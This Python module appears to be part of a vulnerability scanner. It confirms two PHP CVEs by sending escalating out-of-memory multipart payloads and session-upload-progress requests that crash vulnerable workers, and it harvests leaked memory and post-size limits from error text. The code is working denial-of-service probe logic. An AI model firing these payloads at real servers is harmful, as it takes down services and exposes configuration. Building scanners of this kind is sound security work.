"""
Deterministic confirmation oracle — CVE-2026-109618 / 109619.

Built on the angel-sword primitives (validated against php:8.4.26-apache):

  OOM oracle (618): multipart with an oversized field > memory_limit.
    PATCHED  (>= fixed): graceful E_ERROR / clean HTTP status, worker lives.
    VULNERABLE: worker abort mid-response — connection reset (status 0) /
                502 from frontend / RST during body send.

  Rotate-strike (definitive discriminator, mirrors angel-sword stage 0):
    1. session-arming request with OOM (producer; poisons state)
    2. session-initializing follow-up     (consumer; corrupted state)
    VULNERABLE: consumer request also resets/crashes the worker.
    PATCHED: consumer responds normally.
  This two-step is what separates "vulnerable" from "just an OOM" —
  a patched build OOMs gracefully at BOTH steps.

Interaction contract: fires ONLY when the user opts in at the gate
(--auto-confirm / interactive prompt). A vulnerable worker may crash and
auto-restart — that is the disclosed, intended cost of CONFIRMED verdicts.
"""
from __future__ import annotations

import struct
import time
from typing import Optional

from ..core.models import (Evidence, Finding, ScanResult, Verdict)
from ..http.client import TargetClient

OOM_FIELD_MB = 12          # must exceed target memory_limit (default 128M is
                           # covered via header-count multiplication below)
BIG_FIELD = b"A" * (OOM_FIELD_MB * 1024 * 1024)
SID = b"archangel_probe_0001"


def _multipart(parts: list[tuple[str, bytes]], boundary: bytes) -> bytes:
    out = bytearray()
    for name, data in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
        out += data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def _was_worker_abort(status: int, body_len: int) -> bool:
    # Worker-abort signatures: connection torn (0) or gateway timeout (502).
    # 403/405/429 = WAF/front-end rejected the probe — 'blocked', NOT evidence
    # of state corruption; conservative honesty: treat as inconclusive upstream.
    # 413 = intake-limited (post_max_size) — also NOT corruption evidence;
    # handled separately by the escalation ladder (learn post_max_size, retry
    # smaller-multiplication or carry as learned-config data).
    if status in (403, 405, 429, 413):
        return False
    return status == 0 or (status == 502)


def oom_oracle(client: TargetClient, php_entry: str = "/index.php",
               verbose: bool = False, on_event=None) -> Optional[Evidence]:
    """
    THREE-TIER ESCALATION v2 — observe what the target tells us.

      Tier 1: 12MB plain body (lab-validated shape)
      Tier 2: ~1MB wire body + 800 headers/part — wire bytes stay WELL
              under typical post_max_size (6M8M... even 2M) while PHP's
              in-memory representation explodes past memory_limit. This is
              the TRUE GHSA header-multiplication strategy (v1's 13MB tier-2
              body was intake-rejected on small-post_max_size hosts -> false
              CLEANs; this fixes it).
      Tier 3: 130MB + 800 headers/part — exceeds default memory_limit=128M.

    NEW — intake-aware classification + error-text harvesting:
      413 (entity too large)          -> "intake-limited" state: wire body
                                        above post_max_size. NOT a CLEAN.
                                        We harvest post_max_size if leaked.
      Response bodies are scanned for:
        "Allowed memory size of X bytes exhausted"  -> memory_limit learned
        "exceeds the limit of X"                    -> post_max_size learned
      Learned limits are attached to the verdict evidence AND to the ScanResult
      via a result-config dict: (post_max_size, memory_limit) if disclosed.

    Verdicts:
      ANY tier aborts a worker   -> VULNERABLE (tier recorded)
      pair BLOCKED (403/405/429) -> inconclusive (WAF)
      tier2 intake-limited (413) -> syslog continues to tier 3 with the
                                    learned post_max_size in evidence
      ALL tiers graceful          -> patched OR memory_limit=-1 (near
                                    conclusive at 130MB+800H)
    """
    import re as _re
    import time as _t
    from ..exploit.angel_sword import RawTarget, build_multipart

    TIERS = [(12, 0),          # tier 1: plain 12MB (lab shape)
             (1, 800),      # tier 2: 1MB wire + 800 hdrs/part
             (130, 800)]    # tier 3: 130MB + 800 hdrs/part
    raw = RawTarget(f"{client.base}{php_entry}")

    def amplified_multipart(parts, boundary, headers_per_part):
        out = bytearray()
        hdr_amp = b"".join(b"X-Angel-%04d: aaaa bbbb cccc dddd eeee ffff\r\n" % i
                           for i in range(headers_per_part)) if headers_per_part else b""
        for p_ in parts:
            out += b"--" + boundary + b"\r\n"
            out += hdr_amp
            out += (b'Content-Disposition: form-data; name="' +
                    p_["name"].encode() + b'"\r\n\r\n' + p_["data"] + b"\r\n")
        out += b"--" + boundary + b"--\r\n"
        return bytes(out)

    def harvest(body: bytes) -> dict:
        """Extract config leaks from error/warning text in the response."""
        learned = {}
        text = body[:8192].decode("latin1", "replace")
        m = _re.search(r"Allowed memory size of (\d+) bytes", text)
        if m:
            learned["memory_limit_bytes"] = int(m.group(1))
        m2 = _re.search(r"exceeds the limit of (\d+) bytes", text)
        if m2:
            learned["post_max_size_bytes"] = int(m2.group(1))
        return learned

    all_learned = {}
    tier_results = []

    try:
        _reach = raw.post_multipart(b"--x--\r\n", b"x", read_cap=128, timeout=8)
    except Exception:
        _reach = b''
    if _reach == b'':
        return Evidence(kind="oracle_oom_divergence",
                        detail={"patched": None, "step1": 0, "step2": 0,
                                "finding": "target unreachable (connection "
                                           "refused) — inconclusive"})

    for tier_idx, (body_mb, hdrs) in enumerate(TIERS, 1):
        big = b"B" * (body_mb * 1024 * 1024)
        maker = (lambda parts, boundary: amplified_multipart(parts, boundary, hdrs)) \
                if hdrs else (lambda parts, boundary: build_multipart(parts, boundary))

        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  {"name": "f", "filename": "a.txt", "data": b"A" * 64},
                  {"name": "big", "data": big}]
        body1 = maker(parts, b"S" * 17)
        resp1 = raw.post_multipart(body1, b"S" * 17,
                                   read_cap=1 << 20, timeout=240.0)
        del parts, body1, big
        _t.sleep(0.3)

        parts2 = [{"name": "PHPSESSID", "data": b"attacksessionid0001"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        resp2 = raw.post_multipart(build_multipart(parts2, b"BNDRY12345"),
                                  b"BNDRY12345", read_cap=65536, timeout=30.0)

        m1 = _re.match(rb"HTTP/1\.[01] (\d{3})", resp1)
        m2 = _re.match(rb"HTTP/1\.[01] (\d{3})", resp2)
        s1 = int(m1.group(1)) if m1 else 0
        s2 = int(m2.group(1)) if m2 else 0
        harvest1 = harvest(resp1); harvest2 = harvest(resp2)
        all_learned.update(harvest1); all_learned.update(harvest2)

        step1_abort = _was_worker_abort(s1, 0)
        step2_abort = _was_worker_abort(s2, 0)
        blocked = s1 in (403, 405, 429) and s2 in (403, 405, 429)
        intake_limited = s1 == 413  # wire body above post_max_size

        tier_results.append({"tier": tier_idx, "s1": s1, "s2": s2,
                             "learned": {**harvest1, **harvest2}})

        if verbose:
            note = ""
            if hdrs:
                note = f" +{hdrs} hdrs/part (~{len('X-Angel-0000: aaaa bbbb cccc dddd eeee ffff' + chr(13) + chr(10)) * body_mb * hdrs // 1024 // 1024}MB parsed-est)"
            print(f"    [oracle] tier {tier_idx}/3 ({body_mb}MB{note}) "
                  f"step1={s1} step2={s2} learned={ {**harvest1, **harvest2} or '{}' }")

        if on_event:
            on_event(f"tier_{tier_idx}")

        if step1_abort and step2_abort and s1 == 0 and s2 == 0:
            # both connections torn on the FIRST tier pair with no prior response
            # likely unreachable target — inconclusive, never CONFIRMED
            return Evidence(kind="oracle_oom_divergence",
                            detail={"patched": None, "step1": s1, "step2": s2,
                                    "finding": "target unreachable (connection "
                                               "refused) — inconclusive"})
        if step1_abort or step2_abort:
            return Evidence(kind="oracle_oom_divergence",
                            detail={"patched": False, "step1": s1, "step2": s2,
                                    "tier": f"t{tier_idx}:{body_mb}MB+{hdrs}H",
                                    "learned": all_learned,
                                    "finding": f"worker aborted at tier {tier_idx} — "
                                               "state corruption signature (VULNERABLE)"})
        if blocked:
            return Evidence(kind="oracle_oom_divergence",
                            detail={"patched": None, "step1": s1, "step2": s2,
                                    "learned": all_learned,
                                    "finding": "probe BLOCKED by front-end — "
                                               "inconclusive, not confirmed"})
        if intake_limited and tier_idx < 3:
            # wire body over post_max_size -> next tier uses heavier headers
            # NOTE: tier 2 (small wire) shouldn't 413 unless post_max is tiny;
            # tier 1 413 means small post_max -> carve that knowledge into evidence
            continue  # escalate; the learned dict carries the config

    return Evidence(kind="oracle_oom_divergence",
                    detail={"patched": True, "step1": None, "step2": None,
                            "learned": all_learned,
                            "tiers": tier_results,
                            "finding": "graceful through 12MB plain, 1MB+800H "
                                       "amplified, and 130MB+800H tiers — patched "
                                       "OR memory_limit=-1"})



def affinity_oracle(client: TargetClient, php_entry: str = "/index.php",
                    verbose: bool = False, on_event=None) -> Optional[Evidence]:
    """
    CVE-2026-109619 same-worker confirmation: pinned keep-alive connection,
    0x4148-style stall primitive (producer/consumer on one connection rides
    the same FPM/prefork worker by construction).
    """
    boundary = b"archangelAffinity01234567"
    parts = [("PHPSESSID", SID),
             ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
             ("f", b"C" * (1024 * 64))]
    b1 = _multipart(parts, boundary)
    # stall handled at HTTP layer: slow-send is angel-sword's stall twin; here
    # we send complete then immediately re-request on the SAME pinned client.
    c1 = client.pinned("POST", php_entry, **{})
    # pinned() wants request kwargs; use direct call for clarity:
    r1 = client.pinned_POST_multipart(php_entry, b1, boundary)
    if on_event: on_event("step_1")
    time.sleep(1.5)  # > min_freq default 1s
    parts2 = [("PHPSESSID", SID),
              ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn2"),
              ("g", b"D" * 4096)]
    r2 = client.pinned_POST_multipart(php_entry, _multipart(parts2, b"archangelAff2"),
                                      b"archangelAff2")
    if on_event: on_event("step_2")
    if verbose:
        print(f"    [affinity] step1={r1.status} step2={r2.status}")

    if _was_worker_abort(r1.status, 0) or _was_worker_abort(r2.status, 0):
        return Evidence(kind="oracle_worker_affinity",
                        detail={"patched": False,
                                "finding": "pinned-connection worker aborted — "
                                           "cross-request state corruption (VULNERABLE)"})
    return Evidence(kind="oracle_worker_affinity",
                    detail={"patched": True,
                            "finding": "pinned pair survived — patched or "
                                       "stall below threshold"})


def confirm_findings(result: ScanResult, mode: str = "oom", on_event=None,
                     verbose: bool = True) -> ScanResult:
    """Attach oracle evidence to matching CVE findings; promote/retract on it."""
    client = TargetClient(result.target)
    ev: Optional[Evidence]
    try:
        if mode == "oom":
            ev = oom_oracle(client, verbose=verbose, on_event=on_event)
        else:
            ev = affinity_oracle(client, verbose=verbose, on_event=on_event)
    finally:
        client.close()
    if ev is None:
        return result

    for f in result.findings:
        if f.cve_id not in ("CVE-2026-109618", "CVE-2026-109619"):
            continue
        if f.verdict != Verdict.PROBABLE:
            continue
        # Promotion requires the oracle to have OBSERVED the corruption
        # (patched=False). Evidence kind alone is DEFINITIVE-strength, but a
        # WAF-blocked probe (patched=None) must stay inconclusive — never CONFIRMED.
        patched = ev.detail.get("patched")
        if patched is False:
            if mode == "oom" and f.cve_id == "CVE-2026-109618":
                f.promote(ev)
            elif mode == "affinity" and f.cve_id == "CVE-2026-109619":
                f.promote(ev)
        elif patched is True:
            f.retract(f"oracle shows patched behavior: {ev.detail.get('finding')}")
            f.verdict = Verdict.CLEAN
        else:  # None — blocked / inconclusive
            result.notes.append(f"{f.cve_id}: oracle inconclusive — "
                                f"{ev.detail.get('finding')}")
    return result
